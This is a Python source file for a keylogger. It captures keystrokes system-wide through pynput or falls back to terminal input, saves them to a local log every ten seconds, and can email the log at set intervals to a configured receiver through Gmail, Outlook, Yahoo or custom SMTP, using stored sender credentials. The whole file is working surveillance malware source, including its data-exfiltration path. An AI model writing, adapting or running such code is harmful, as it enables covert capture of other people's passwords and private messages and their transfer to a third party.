#!/usr/bin/env python3
import os
import datetime
import time
import threading
import signal
import atexit
import smtplib
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# For system-wide keyboard monitoring
try:
    from pynput import keyboard
    USING_PYNPUT = True
except ImportError:
    print("pynput not available, falling back to terminal input mode")
    import sys
    import termios
    import tty
    USING_PYNPUT = False

# Configuration file for email settings
CONFIG_FILE = "keylogger_config.json"

# File to save the keystrokes
log_file = "keystrokes.txt"

# Buffer to store keystrokes before writing to file
keystroke_buffer = []
buffer_lock = threading.Lock()
last_write_time = time.time()
last_email_time = time.time()

# For detecting "END" sequence
end_sequence = []
running = True

# Terminal display settings
display_lock = threading.Lock()
current_line = ""

# Email configuration
email_config = {}

def load_email_config():
    """Load email configuration from file or create default config."""
    global email_config
    
    default_config = {
        "enabled": False,
        "smtp_server": "smtp.gmail.com",
        "smtp_port": 587,
        "sender_email": "",
        "sender_password": "",
        "receiver_email": "",
        "send_interval": 300,  # Send email every 5 minutes (300 seconds)
        "subject_prefix": "Keylogger Report"
    }
    
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                email_config = json.load(f)
                # Ensure all keys exist
                for key, value in default_config.items():
                    if key not in email_config:
                        email_config[key] = value
        else:
            email_config = default_config
            save_email_config()
    except Exception as e:
        print(f"Error loading config: {e}")
        email_config = default_config

def save_email_config():
    """Save email configuration to file."""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(email_config, f, indent=4)
    except Exception as e:
        print(f"Error saving config: {e}")

def setup_email_config():
    """Interactive setup for email configuration."""
    global email_config
    
    print("\n=== Email Configuration Setup ===")
    print("Configure email settings to receive keystroke logs via email.")
    
    enable = input("Enable email notifications? (y/n): ").lower().strip()
    email_config["enabled"] = enable == 'y'
    
    if not email_config["enabled"]:
        save_email_config()
        return
    
    print("\nEmail Provider Settings:")
    print("1. Gmail (smtp.gmail.com:587)")
    print("2. Outlook/Hotmail (smtp-mail.outlook.com:587)")
    print("3. Yahoo (smtp.mail.yahoo.com:587)")
    print("4. Custom")
    
    choice = input("Select email provider (1-4): ").strip()
    
    if choice == "1":
        email_config["smtp_server"] = "smtp.gmail.com"
        email_config["smtp_port"] = 587
    elif choice == "2":
        email_config["smtp_server"] = "smtp-mail.outlook.com"
        email_config["smtp_port"] = 587
    elif choice == "3":
        email_config["smtp_server"] = "smtp.mail.yahoo.com"
        email_config["smtp_port"] = 587
    elif choice == "4":
        email_config["smtp_server"] = input("SMTP Server: ").strip()
        email_config["smtp_port"] = int(input("SMTP Port: ").strip())
    
    email_config["sender_email"] = input("Sender email address: ").strip()
    email_config["sender_password"] = input("Sender email password (or app password): ").strip()
    email_config["receiver_email"] = input("Receiver email address: ").strip()
    
    interval = input("Send interval in minutes (default 5): ").strip()
    try:
        email_config["send_interval"] = int(interval) * 60
    except:
        email_config["send_interval"] = 300
    
    email_config["subject_prefix"] = input("Email subject prefix (default 'Keylogger Report'): ").strip()
    if not email_config["subject_prefix"]:
        email_config["subject_prefix"] = "Keylogger Report"
    
    save_email_config()
    print("Email configuration saved!")

def send_email_report():
    """Send keystroke log via email."""
    if not email_config.get("enabled", False):
        return
    
    try:
        # Read current log content
        if not os.path.exists(log_file):
            return
            
        with open(log_file, 'r') as f:
            log_content = f.read()
        
        if not log_content.strip():
            return
        
        # Create email message
        msg = MIMEMultipart()
        msg['From'] = email_config["sender_email"]
        msg['To'] = email_config["receiver_email"]
        msg['Subject'] = f"{email_config['subject_prefix']} - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        # Email body
        body = f"""
Keylogger Report
Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Log Content:
{log_content}

---
This is an automated report from the keylogger application.
        """
        
        msg.attach(MIMEText(body, 'plain'))
        
        # Send email
        server = smtplib.SMTP(email_config["smtp_server"], email_config["smtp_port"])
        server.starttls()
        server.login(email_config["sender_email"], email_config["sender_password"])
        text = msg.as_string()
        server.sendmail(email_config["sender_email"], email_config["receiver_email"], text)
        server.quit()
        
        print(f"\n[EMAIL] Report sent to {email_config['receiver_email']}")
        
    except Exception as e:
        print(f"\n[EMAIL ERROR] Failed to send email: {e}")

def get_timestamp():
    """Return current timestamp in a readable format."""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def display_keystroke(key_char):
    """Display keystroke in terminal in real-time."""
    global current_line
    
    with display_lock:
        if isinstance(key_char, str) and len(key_char) == 1:
            print(key_char, end='', flush=True)
            current_line += key_char
        else:
            # Format special keys for display
            if key_char == "SPACE":
                print(" ", end='', flush=True)
                current_line += " "
            elif key_char == "ENTER":
                print()  # New line
                current_line = ""
            elif key_char == "TAB":
                print("\t", end='', flush=True)
                current_line += "\t"
            elif key_char == "BACKSPACE":
                if current_line:
                    print("\b \b", end='', flush=True)  # Backspace, space, backspace
                    current_line = current_line[:-1]
            else:
                display_text = f"[{key_char}]"
                print(display_text, end='', flush=True)
                current_line += display_text

def write_buffer_to_file():
    """Write the buffered keystrokes to file in horizontal format."""
    global keystroke_buffer
    
    with buffer_lock:
        if keystroke_buffer:
            timestamp = get_timestamp()
            keystroke_text = "".join(keystroke_buffer)
            
            with open(log_file, "a") as f:
                f.write(f"{timestamp}: {keystroke_text}\n")
            
            # Clear the buffer after writing
            keystroke_buffer = []

def check_end_sequence():
    """Check if the last three characters are 'END'"""
    global end_sequence, running
    
    if len(end_sequence) >= 3:
        last_three = ''.join(end_sequence[-3:]).upper()
        if last_three == "END":
            running = False
            return True
    return False

def buffer_keystroke(key_char):
    """Add keystroke to buffer and display it."""
    global keystroke_buffer, last_write_time, end_sequence, last_email_time
    
    # Display keystroke in terminal
    display_keystroke(key_char)
    
    with buffer_lock:
        # Add to buffer
        if isinstance(key_char, str) and len(key_char) == 1:
            keystroke_buffer.append(key_char)
            end_sequence.append(key_char)
            if len(end_sequence) > 3:
                end_sequence.pop(0)
        else:
            # Format special keys
            if key_char == "SPACE":
                keystroke_buffer.append(" ")
                end_sequence.append(" ")
            elif key_char == "ENTER":
                keystroke_buffer.append("\n")
                end_sequence.append("\n")
            elif key_char == "TAB":
                keystroke_buffer.append("\t")
                end_sequence.append("\t")
            elif key_char == "BACKSPACE":
                if keystroke_buffer:
                    keystroke_buffer.pop()
                if end_sequence:
                    end_sequence.pop()
            else:
                keystroke_buffer.append(f"[{key_char}]")
    
    # Check for the END sequence
    check_end_sequence()
    
    current_time = time.time()
    
    # Check if it's time to write to file (every 10 seconds)
    if current_time - last_write_time >= 10:
        write_buffer_to_file()
        last_write_time = current_time
    
    # Check if it's time to send email
    if email_config.get("enabled", False) and current_time - last_email_time >= email_config.get("send_interval", 300):
        threading.Thread(target=send_email_report, daemon=True).start()
        last_email_time = current_time

# PYNPUT IMPLEMENTATION (System-wide)
def on_press(key):
    """Handler for key press events using pynput."""
    global running
    
    if not running:
        return False  # Stop listener
    
    try:
        # Regular character
        key_char = key.char
        buffer_keystroke(key_char)
    except AttributeError:
        # Special key
        key_name = str(key).replace("Key.", "")
        # Map common keys
        if key == keyboard.Key.space:
            buffer_keystroke("SPACE")
        elif key == keyboard.Key.enter:
            buffer_keystroke("ENTER")
        elif key == keyboard.Key.tab:
            buffer_keystroke("TAB")
        elif key == keyboard.Key.backspace:
            buffer_keystroke("BACKSPACE")
        else:
            buffer_keystroke(key_name)
    
    return running  # Continue if running is True

# TERMINAL IMPLEMENTATION (Fallback)
def get_char():
    """Get a single character from standard input."""
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(sys.stdin.fileno())
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch

def cleanup():
    """Clean up before exiting."""
    print("\n")  # New line for clean exit
    write_buffer_to_file()  # Write any remaining keystrokes
    
    # Send final email report
    if email_config.get("enabled", False):
        send_email_report()
    
    with open(log_file, "a") as f:
        f.write(f"{get_timestamp()}: [INFO] Keylogger stopped\n")
    
    print(f"\nKeylogger stopped. Log saved to {os.path.abspath(log_file)}")
    
    # Restore terminal settings if not using pynput
    if not USING_PYNPUT and 'original_terminal_settings' in globals():
        fd = sys.stdin.fileno()
        termios.tcsetattr(fd, termios.TCSADRAIN, original_terminal_settings)

# Handle Ctrl+C gracefully
def signal_handler(sig, frame):
    global running
    running = False
    cleanup()
    if not USING_PYNPUT:  # Terminal mode requires explicit exit
        sys.exit(0)

# Timer function to ensure buffer is written periodically
def timer_write_buffer():
    global running
    while running:
        time.sleep(10)
        write_buffer_to_file()
        global last_write_time
        last_write_time = time.time()

def main_pynput():
    """Main function using pynput for system-wide monitoring."""
    # Create log file with header
    with open(log_file, "w") as f:
        f.write(f"=== System-wide Keylogger Started {get_timestamp()} ===\n")
    
    print(f"Keylogger started. Logging to {os.path.abspath(log_file)}")
    print("Type 'END' to stop the keylogger.")
    print("Keystrokes will be displayed below and saved to file every 10 seconds.")
    
    if email_config.get("enabled", False):
        print(f"Email reports will be sent to {email_config['receiver_email']} every {email_config['send_interval']//60} minutes.")
    
    print("=" * 50)
    
    # Start timer thread to ensure buffer is written periodically
    timer_thread = threading.Thread(target=timer_write_buffer, daemon=True)
    timer_thread.start()
    
    # Start listening for keystrokes
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    
    # Final cleanup
    cleanup()

def main_terminal():
    """Main function using terminal input (fallback)."""
    global original_terminal_settings, running
    
    # Save original terminal settings
    fd = sys.stdin.fileno()
    original_terminal_settings = termios.tcgetattr(fd)
    
    # Register cleanup function and signal handler
    atexit.register(cleanup)
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create log file with header
    with open(log_file, "w") as f:
        f.write(f"=== Terminal Keylogger Started {get_timestamp()} ===\n")
    
    print(f"Keylogger started. Logging to {os.path.abspath(log_file)}")
    print("Type 'END' to stop the keylogger.")
    print("Note: This will only capture keystrokes while this terminal window is in focus.")
    print("Keystrokes will be displayed below and saved to file every 10 seconds.")
    
    if email_config.get("enabled", False):
        print(f"Email reports will be sent to {email_config['receiver_email']} every {email_config['send_interval']//60} minutes.")
    
    print("=" * 50)
    
    # Start timer thread to ensure buffer is written periodically
    timer_thread = threading.Thread(target=timer_write_buffer, daemon=True)
    timer_thread.start()
    
    # Start capturing keystrokes
    while running:
        char = get_char()
        
        # ASCII representation for special characters
        char_code = ord(char)
        if char_code < 32 or char_code == 127:
            char_name = {
                27: 'ESC',
                9: 'TAB',
                13: 'ENTER',
                127: 'BACKSPACE',
                8: 'BACKSPACE',
                32: 'SPACE'
            }.get(char_code, f"CTRL+{chr(char_code + 64)}")
            
            buffer_keystroke(char_name)
        else:
            buffer_keystroke(char)
        
        # Exit if END was typed
        if not running:
            break

if __name__ == "__main__":
    # Load email configuration
    load_email_config()
    
    # Check for setup argument
    if len(os.sys.argv) > 1 and os.sys.argv[1] == "--setup":
        setup_email_config()
        exit()
    
    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    if USING_PYNPUT:
        # Use pynput for system-wide monitoring
        main_pynput()
    else:
        # Check if running in a terminal
        if not sys.stdin.isatty():
            print("This script must be run in a terminal.")
            sys.exit(1)
            
        # Check if running on a UNIX-like system
        if not hasattr(sys, 'stdin') or not hasattr(termios, 'tcgetattr'):
            print("This script requires a UNIX-like environment with termios support.")
            sys.exit(1)
            
        main_terminal()